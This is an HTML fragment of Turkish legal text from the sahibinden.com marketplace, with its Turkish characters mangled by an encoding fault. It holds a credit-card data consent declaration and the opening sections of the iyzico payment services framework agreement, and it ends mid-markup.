            <p> ????bu Kullan??c?? Beyan?? ile; PAYTEN???e sundu??um kredi kart?? bilgilerinin PAYTEN taraf??ndan kaydedilmesine, saklanmas??na, sahibinden.com taraf??ndan sat??n al??nmas??na arac??l??k edilen ??r??n ve hizmetlerde; SAH??B??NDEN taraf??ndan verilecek tahsilat talimatlar??na uygun olarak ??YZ??CO taraf??ndan SAH??B??NDEN ad??na ger??ekle??tirilen ??deme i??lemleri i??in kredi kart?? bilgilerimin PAYTEN taraf??ndan ??YZ??CO???ya iletilmesine, tahsilata ili??kin i??lem sonu??lar??n??n SAH??B??NDEN???e g??nderilmesine muvafakat etti??imi kabul, beyan ve taahh??t ederim.</p>
            <br>
            <p> ??YZ??CO taraf??ndan SAH??B??NDEN???e verilen ??deme hizmetinin herhangi bir sebeple sona ermesi halinde; kredi kart?? bilgilerimin PAYTEN taraf??ndan SAH??B??NDEN???in ??deme hizmeti alaca???? ??deme kurulu??una g??nderilmesine muvafakat etti??imi kabul, beyan ve taahh??t ederim. </p>
            <br>
            <p>
              <strong>
                <u>sahibinden.com taraf??ndan sunulan hizmetlerin al??m??na ili??kin bilgi:</u>
              </strong>
              <br>sahibinden.com taraf??ndan sunulan herhangi bir hizmeti sat??n almak isteyen Kullan??c??lar??n da kredi kart?? bilgileri PAYTEN taraf??ndan sakland?????? gibi, ??deme i??lemlerinin ger??ekle??tirilebilmesi i??in kart bilgilerinin kullan??lmas?? ve i??lenmesi de sadece PAYTEN taraf??ndan ger??ekle??tirilmektedir.
            </p>
            <br>
            <p> Kredi kart?? bilgileri kullan??m??n??n her bir i??lemde benim talebim ve onay??m ??zerine ger??ekle??mekte oldu??unu ve bu kapsamda SAH??B??NDEN???in kart bilgilerimin saklanmas??na ili??kin herhangi bir sorumlulu??u bulunmad??????n??, kart bilgilerimin saklanmas?? ile ilgili SAH??B??NDEN???e kar???? yasal yollara ba??vurma hakk??mdan gayri kabili r??cu olarak feragat etti??imi ayr??ca kabul, beyan ve taahh??t ederim. </p>
            <br>
            <p> PAYTEN taraf??ndan SAH??B??NDEN???e verilen hizmetin herhangi bir sebeple sona ermesi halinde; kredi kart?? bilgilerimin SAH??B??NDEN???e veya SAH??B??NDEN taraf??ndan bildirilen firmaya PAYTEN taraf??ndan devredilmesine gayri kabili r??cu olarak muvafakat etti??imi, bu konuda PAYTEN???i yetkilendirdi??imi ve talepte bulundu??umu, devir tarihi itibariyle kredi kart?? bilgilerimin kaydedilmesi, saklanmas??, ??demelerde kullan??lmas??na ili??kin sorumlulu??un devredilen firmaya ait olaca????n?? kabul, beyan ve taahh??t ederim. </p>
            <br>
            <p> Kredi kart?? bilgilerimin ve kredi kart?? i??lem sonucu bilgilerimin al??nmas??n??n, PAYTEN???e ve ??YZ??CO???ya veya ileride olabilecek di??er bir ??deme kurulu??una aktar??lmas??n??n ve i??lenmesinin kredi kart?? ile ??deme yap??lan yukar??da say??lan sahibinden.com taraf??ndan sunulan hizmetler ile sahibinden.com taraf??ndan sat??n al??nmas??na arac??l??k edilen ??r??n ve hizmetler i??lemlerinin yap??labilmesi i??in gerekli oldu??unu, bu bak??mdan bu i??lemlerin yap??labilmesi i??in bu verilerin taraf??mca verilmesinin ifa ??art?? te??kil etti??ini, SAH??B??NDEN???in ve PAYTEN ile ??YZ??CO???nun veya ileride olabilecek di??er bir ??deme kurulu??unun bu bilgileri ??yelik S??zle??mesi, Kullan??m Ko??ullar??, Gizlilik Politikas?? kapsam??nda kulland??????n?? bildi??imi, ki??isel verilerim ile ilgili olarak&nbsp; <a href="https://www.sahibinden.com/sozlesmeler/kisisel-verilerin-korunmasi-ve-islenmesi-hakkinda-bilgilendirme-58">Ki??isel Verilerin Korunmas??</a>&nbsp;sayfas??ndaki Ki??isel Verilerin Korunmas?? Hakk??nda Bilgilendirme metnini okudu??umu ve haklar??m?? bildi??imi; kendi kredi kart?? bilgilerim d??????nda ??????nc?? ki??ilerin kredi kart?? bilgilerini vermem veya SAH??B??NDEN portali ??zerinden bu verileri kullanmam durumunda bu verilerin korunmas??ndan, i??lenmesinden, aktar??lmas??ndan ve KVKK kapsam??ndaki t??m y??k??ml??l??klerden ve hukuka ayk??r?? kullan??mdan dolay?? t??m cezai ve hukuki sorumlulu??un taraf??ma ait oldu??unu, SAH??B??NDEN???in ve ??deme kurulu??lar??n??n kendi sistemlerinde yukar??da say??lan i??lemlerin ger??ekle??tirilmesi i??in zorunlu olarak toplad?????? ki??isel veriler d??????ndaki hi??bir ki??isel veri i??in KVKK kapsam??nda herhangi bir y??k??ml??l??klerinin ve sorumluluklar??n??n olmad??????n?? kabul, beyan ve taahh??t ederim. </p>
            <br>
            <p> Ki??isel verilerin korunmas?? y??k??ml??l??????ne ayk??r?? hareket etmem veya ki??isel verilerin i??lenmesi, aktar??lmas?? veya sair surette bir i??leme taraf??mca konu edilmesi ve bu kullan??m??n bir ihlal meydana getirmesi durumunda, Ki??isel Verileri Koruma Kurulu???nun veya idari makamlar??n veya mahkemelerin ki??isel verilerle ilgili olarak verdikleri kararlar neticesinde ???SAH??B??NDEN???in bir zarara u??ramas?? durumunda bu zarar?? ilk talepte nakden ve defaten tazmin edece??imi kabul, beyan ve taahh??t ederim. </p>
          </div>
          <div id="marketPlaceProviderAgreement" class="marketPlaceProviderAgreement">
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#333333">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">27 Haziran 2015 tarihinde y??r??rl????e giren ??deme Hizmetleri Y??netmeli??i???ne g??re; ??deme i??lemleri y??netiminin Bankac??l??k D??zenleme ve Denetleme Kurumu (BDDK) taraf??ndan yetkilendirilmi?? bir ??deme kurulu??u taraf??ndan yap??lmas?? zorunludur. ??denen ??r??n bedeli, yetkilendirilmi?? bir ??deme kurulu??u taraf??ndan g??vence alt??na al??nm???? olmaktad??r.</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#333333">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Bu ama??la, Sahibinden.com ??zerinden ??r??n veya hizmet sat??n alabilmeniz i??in, ??deme i??lemini ger??ekle??tirecek olan iyzico ??deme ve Elektronik Para Hizmetleri A.??.'ye (???iyzico???) ait a??a????daki ??deme Hizmeti ??er??eve S??zle??mesi???ni onaylaman??z, ??deme i??lemlerinizin iyzico ??zerinden yap??laca????n?? kabul etmeniz gerekmektedir.</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p align="center" style="margin-bottom: 0.21cm; line-height: 100%">
              <br> &nbsp;
            </p>
            <p align="center" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">iYZICO ??DEME H??ZMET?? ??ER??EVE S??ZLE??MES??</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">1. TARAFLAR</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">????bu ???</font>
                </font>
              </font>
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">iyzico ??deme Hizmeti ??er??eve S??zle??mesi??? (???S??zle??me???)</font>
                </font>
              </font>
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">, a??a????da bilgileri yer alan ???iyzico??? ile i??bu S??zle??me???deki hizmetlerden faydalanmak isteyen Kullan??c?? aras??nda akdedilmi??tir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">Unvan</font>
                </font>
              </font>
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">: iyzi ??deme ve Elektronik Para Hizmetleri A.??. (???iyzico???)</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">Adres</font>
                </font>
              </font>
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">: Burhaniye Mah. Atilla Sok. No:7 ??sk??dar ??stanbul</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">Vergi Daire ve No</font>
                </font>
              </font>
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">: ??sk??dar Vergi Dairesi 483 034 3157</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">iyzico ve Kullan??c?? bundan b??yle birlikte ???Taraflar???, ayr?? ayr?? ???Taraf??? olarak an??lacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">2. TANIMLAR</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">??nternet Sitesi</font>
                </font>
              </font>
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">: Sat??c?? taraf??ndan sat????a sunulan ??r??n ve hizmetleri te??hir etmek i??in, Al??c?? taraf??ndan ise ??r??n veya hizmetlerin sat??n al??nmas?? i??in kullan??lan </font>
                </font>
              </font>
              <font color="#0000ff">
                <u>
                  <a href="http://www.sahibinden.com/">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">www.sahibinden.com</font>
                    </font>
                  </a>
                </u>
              </font>
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt"> alan adl?? internet sitesi ve/veya mobil uygulamalar</font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Servis: ????bu S??zle??me???de belirlenen h??k??m ve ko??ullar ??er??evesinde iyzico taraf??ndan Al??c?? ve Sat??c?????ya sunulacak olan hizmet</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Al??c??</font>
                    </font>
                  </font>
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">: ??nternet Sitesi ??zerinden i??bu S??zle??me kapsam??nda sunulan servisler arac??l?????? ile ??r??n veya hizmet al??m?? yapan ve bu ama??la Servis???ten faydalanan ger??ek veya t??zel ki??i,</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Sat??c??: ??deme ????lemi???ne konu fonun ula??mas?? istenilen, ??nternet Sitesi ??zerinden sat???? ger??ekle??tiren ger??ek veya t??zel ki??i</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Kullan??c??: ????bu S??zle??me???deki hizmetlerden Al??c?? veya Sat??c?? s??fat??yla faydalanan ger??ek veya t??zel ki??i (Al??c?? ve Sat??c?? birlikte ???Kullan??c????? olarak an??lacakt??r)</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">S??zle??me</font>
                    </font>
                  </font>
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">: Kullan??c?? ile akdedilen i??bu ??deme Hizmeti ??er??eve S??zle??mesi</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Pazaryeri veya </font>
                    </font>
                  </font>
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">SAH??B??NDEN: ??nternet Sitesi???ni i??letmekte olan Sahibinden Bilgi Teknolojileri Pazarlama ve Ticaret A.??.</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">iyzico</font>
                    </font>
                  </font>
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">: ??leti??im bilgileri i??bu S??zle??me???nin 1. maddesinde belirtilen ve i??bu S??zle??me???de ??deme hizmeti sa??lay??c?? taraf olan iyzi ??deme ve Elektronik Para Hizmetleri A.??.</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Platform: iyzico taraf??ndan geli??tirilen sanal ??deme ve do??rulama a?? ge??idi olan bir yaz??l??mdan ibaret sanal platform</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">??deme Arac??</font>
                    </font>
                  </font>
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">: Kullan??c?? taraf??ndan ??deme emrini vermek i??in kullan??lan kart, cep telefonu, ??ifre ve benzeri ki??iye ??zel ara??</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">??deme Hesab??</font>
                    </font>
                  </font>
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">: Kullan??c?? ad??na iyzico nezdinde a????lan ve ??deme i??leminin y??r??t??lmesinde kullan??lan hesap</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">??deme ????lemi</font>
                    </font>
                  </font>
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">: ??nternet Sitesi???nde sat????a sunulan ??r??nler veya hizmetler i??in ??deme yap??lmas?? amac??yla, Platform arac??l?????? ile y??r??t??len i??lemler</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Sistem Orta????: Platform arac??l?????? ile ??demelerin i??lenmesi konusunda i??birli??inde bulunulan banka veya finans kurulu??u</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Onay Tarihi</font>
                    </font>
                  </font>
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">: Kullan??c?? taraf??ndan ??nternet Sitesi???nden sat??n al??nan ??r??n veya hizmetin teslim edildi??ine ili??kin onay??n verildi??i veya s??z konusu onay??n verilmesi i??in Pazaryeri taraf??ndan belirlenen s??renin doldu??u tarih</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Hatal??/Yetkisiz ????lem</font>
                    </font>
                  </font>
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">: Hatal?? bir ??ekilde veya Kullan??c?????n??n talimat?? d??????nda ger??ekle??tirilen ??deme ????lemi</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">????pheli ????lem</font>
                    </font>
                  </font>
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">: S??zle??me ile belirlenen durumlar da dahil olmak ??zere, Hatal??/Yetkisiz ????lem olarak de??erlendirilme ihtimali bulunan ??deme ????lemi</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Hassas ??deme Verisi</font>
                    </font>
                  </font>
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">: Kullan??c?? taraf??ndan ??deme emrinin verilmesinde veya Kullan??c?????n??n kimli??inin do??rulanmas??nda kullan??lan, ele ge??irilmesi veya de??i??tirilmesi halinde doland??r??c??l??k ya da kullan??c??lar ad??na sahte i??lem yap??lmas??na imk??n verebilecek ??ifre, g??venlik sorusu, sertifika, ??ifreleme anahtar?? ile PIN, kart numaras??, son kullanma tarihi, CVV2, CVC2 kodu gibi veriler</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">Yetkili Personel</font>
                    </font>
                  </font>
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">: Kullan??c?????ya Platform kullan??m?? hakk??nda destek vermek ve ileti??ime ge??mek ??zere iyzico taraf??ndan yetkilendirilmi?? olan personel</font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <br> &nbsp;
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">3. S??ZLE??MEN??N KONUSU</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">Pazaryeri taraf??ndan i??letilmekte ??nternet Sitesi???nde ??deme hizmetleri iyzico taraf??ndan sunulmaktad??r. iyzico, bu kapsamda hem Sat??c?????ya, hem de Al??c?????ya 6493 say??l?? ??deme ve Menkul K??ymet Mutabakat Sistemleri, ??deme Hizmetleri ve Elektronik Para Kurulu??lar?? Hakk??nda Kanun (???Kanun???) uyar??nca ??deme hizmeti verecektir. Bu kapsamda; Al??c?????dan tahsil edilen ve ??nternet Sitesi ??zerinden temin edilen ??r??n veya hizmetin Al??c?????ya tam ve gere??i gibi teslimine ili??kin onay??n al??nmas??na kadar Al??c?????n??n ??deme Hesab?????nda tutulan ??r??n/hizmet bedeli; ??r??n/hizmet sat??????na ili??kin h??k??mlere uygun olarak Al??c?????n??n onay?? ??zerine veya sat??n al??nan hizmetin kullan??m?? ??zerine iyzico taraf??ndan Sat??c?????n??n ??deme Hesab??na aktar??lacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">????bu S??zle??me; yukar??da belirtilen kapsamda Al??c?????ya ??nternet Sitesi ??zerinden sat??n ald?????? ??r??n ve hizmetin ??cretinin Sat??c?????ya aktar??m?? i??in sunulan Servis???e ili??kin esaslar ile Taraflar?????n bu kapsamdaki hak ve y??k??ml??l??klerini d??zenlemektedir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">4. GENEL ??ARTLAR</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">4.1. KAYIT</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">S??zle??me???nin Kullan??c?? taraf??ndan ??nternet Sitesi ??zerinden onayland?????? tarih itibariyle i??bu S??zle??me y??r??rl??k ve ge??erlilik kazanacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">4.2. KULLANIM KO??ULLARI</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">a) Kullan??c?? Servis???i ancak S??zle??me y??r??rl????e girdikten sonra kullanabilecektir.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">b) iyzico, Kullan??c?????y?? telefonla arama ve Pazaryeri taraf??ndan iletilen bilgileri do??rulama, ek bilgi ve belge talep etme, herhangi bir sebep bildirmeksizin Kullan??c?????y?? kaydetmeme haklar??n?? sakl?? tutmaktad??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">5. TARAFLARIN HAK VE Y??K??ML??L??KLER?? </font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">a) ????bu S??zle??me uyar??nca iyzico, Kullan??c?? taraf??ndan ??nternet Sitesi???nden sipari?? edilen ??r??n ve hizmetlere ili??kin ??demelerin i??leme al??nmas?? ve Sat??c?????ya ??demelerin yap??lmas?? amac??yla Servis sunmay?? kabul ve taahh??t eder.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">b) iyzico, yetkisiz ki??iler taraf??ndan bilgilere eri??ilmesinin engellenmesi amac??yla Platform???u gerekli g??venlik seviyesinde tutmak i??in en iyi ??abay?? g??sterecektir. Kullan??c?? bu anlamda iyzico???ya azami deste??i sa??layacak ve iyzico???nun talimatlar??na uygun davranacakt??r.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">c) iyzico, ??zellikle Sistem Ortaklar?? taraf??ndan ger??ekle??tirilen g??venlik standard?? de??i??ikliklerinin sonucunda g??venlik standard??n?? de??i??tirme hakk??n?? sakl?? tutar.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">d) Kullan??c??, yapt?????? ??demelere ait provizyonlar??n Sistem Ortaklar?? taraf??ndan belirtilen ko??ullar kapsam??nda ger??ekle??tirildi??ini bildi??ini, Sistem Ortaklar?????n??n sitelerine y??nelik ihl??ller veya sald??r??larda (hacking, phishing) iyzico???nun herhangi bir sorumlulu??u bulunmad??????n?? kabul eder.</font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">e) Kullan??c??, Platform???a eri??im imkan?? tan??yan ??ifreyi ve/veya ??deme Arac?????na ili??kin temin etti??i bilgileri (varsa) gizli tutmakla, yetkisiz ??ah??slara if??a etmemekle ve bu ??ifrelerin tahsis amac?? haricinde ba??kaca ama??lar i??in kullan??lmas??n?? ??nlemekle y??k??ml??d??r. Kullan??c?? ayr??ca bahsi ge??en bilgiler veya ??deme Arac?????na ait bilgilerin kaybolmas??, ??al??nmas?? veya yetkisiz bir ??ekilde kullan??m??n??n s??z konusu olmas?? halinde; durumu derhal iyzico???ya i??bu S??zle??me???de belirtilen y??ntemlerden biriyle bildirmekle y??k??ml??d??r. iyzico, Kullan??c?? taraf??ndan s??z konusu bilgilerin kaybedilmesi veya if??a edilmesi durumunda herhangi bir sorumlulu??a sahip olmad?????? gibi, kusurun iyzico???ya ait oldu??u kan??tlanmad?????? m??ddet??e ??????nc?? ??ah??slar taraf??ndan Kullan??c?????ya verilecek zararlardan da sorumlu de??ildir. </font>
                </font>
              </font>
            </p>
            <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
              <font color="#000000">
                <font face="Arial, serif">
                  <font size="2" style="font-size: 10pt">f) Kullan??c??, Platform???un veya bir y??netim hesab??n??n kan??tlanabilir bir ??ekilde yetkisiz olarak k??t?? ama??l?? kullan??m??ndan veya y??netim hesab??na yetkisiz eri??imden kendi kusuru ??l????s??nde sorumlu olacakt??r.</font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt">g) Kullan??c??, Platform???un i??levlerine m??dahale etmeyece??ini, Platform???u kurulum ve kullan??m talimatlar??na uygun olarak kullanaca????n??, iyzico???nun talimatlar??na uygun davranaca????n?? kabul ve beyan eder.</font>
                    </font>
                  </font>
                  <font color="#333333">
                    <font face="Arial, serif">
                      <font size="2" style="font-size: 10pt"></font>
                    </font>
                  </font>
                </font>
              </font>
            </p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
            <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
              <font face="Times New Roman, serif">
                <font size="3" style="font-size: 12pt">
                  <font color="#000000">
                    <font face="Arial, serif">
